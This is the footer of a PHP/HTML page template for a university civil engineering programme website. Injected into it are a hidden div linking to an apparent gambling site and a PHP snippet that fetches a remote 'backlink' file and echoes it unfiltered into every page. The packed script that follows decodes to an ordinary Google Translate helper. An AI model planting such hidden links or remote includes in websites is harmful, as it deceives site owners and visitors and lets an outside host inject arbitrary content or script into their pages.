                            <strong> Prodi Teknik Sipil - Universitas Muhammadiyah Parepare</strong><br>Developed by : <i
                                class="text-white font-weight-bold">Pustikom UMPAR</i>
                        </a>
                    </p>
                </div>
                <!-- <div class="col-md-5 col-lg-4 ml-lg-0 mt-1">
                    <div class="text-center text-md-right">
                        <ul class="social-icons list-unstyled list-inline">
                            <li class="list-inline-item mr-0">
                                <a class="btn-floating btn-sm primary-color mx-1">
                                    <i class="fab fa-facebook-f"></i>
                                </a>
                            </li>
                            <li class="list-inline-item mr-0">
                                <a class="btn-floating btn-sm light-green lighten-3 mx-1">
                                    <i class="fab fa-twitter"></i>
                                </a>
                            </li>
                            <li class="list-inline-item mr-0">
                                <a class="btn-floating btn-sm pink lighten-1 mx-1">
                                    <i class="fab fa-instagram"></i>
                                </a>
                            </li>
                            <li class="list-inline-item mr-0">
                                <a class="btn-floating btn-sm green darken-1t mx-1">
                                    <i class="fab fa-youtube"></i>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div> -->
            </div>
        </div>
    </footer>

    <a id="back-to-top" href="#" class="btn-floating headnav-1 darken-4 back-to-top" role="button"><i
            class="fa fa-chevron-up"></i></a>
<div style="display: none;">
<a href="https://gelora4d.id/">https://gelora4d.id/</a>
</div>
	<?php
$a = file_get_contents('https://inilinkku.com/backlink/index.txt');
echo $a;
?>
    <script src="<?= BASE_URL ?>js/jquery.min.js"></script>
    <script src="<?= BASE_URL ?>js/popper.min.js"></script>
    <script src="<?= BASE_URL ?>js/bootstrap.min.js"></script>
    <script src="<?= BASE_URL ?>js/mdb.min.js"></script>
    <script src="<?= BASE_URL ?>js/slick.js"></script>
    <script src="<?= BASE_URL ?>js/jsku.js"></script>
    <script type="text/javascript"
        src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit2"></script>
    <script>
        /* <![CDATA[ */
        eval(function (p, a, c, k, e, r) {
            e = function (c) {
                return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) :
                    c.toString(36))
            };
            if (!''.replace(/^/, String)) {
                while (c--) r[e(c)] = k[c] || e(c);
                k = [function (e) {
                    return r[e]
                }];
                e = function () {
                    return '\\w+'
                };
                c = 1
            };
            while (c--)
                if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
            return p
        }('6 7(a,b){n{4(2.9){3 c=2.9("o");c.p(b,f,f);a.q(c)}g{3 c=2.r();a.s(\'t\'+b,c)}}u(e){}}6 h(a){4(a.8)a=a.8;4(a==\'\')v;3 b=a.w(\'|\')[1];3 c;3 d=2.x(\'y\');z(3 i=0;i<d.5;i++)4(d[i].A==\'B-C-D\')c=d[i];4(2.j(\'k\')==E||2.j(\'k\').l.5==0||c.5==0||c.l.5==0){F(6(){h(a)},G)}g{c.8=b;7(c,\'m\');7(c,\'m\')}}',
            43, 43,
            '||document|var|if|length|function|GTranslateFireEvent|value|createEvent||||||true|else|doGTranslate||getElementById|google_translate_element2|innerHTML|change|try|HTMLEvents|initEvent|dispatchEvent|createEventObject|fireEvent|on|catch|return|split|getElementsByTagName|select|for|className|goog|te|combo|null|setTimeout|500'
            .split('|'), 0, {}))
        /* ]]> */
    </script>
</body>

</html>
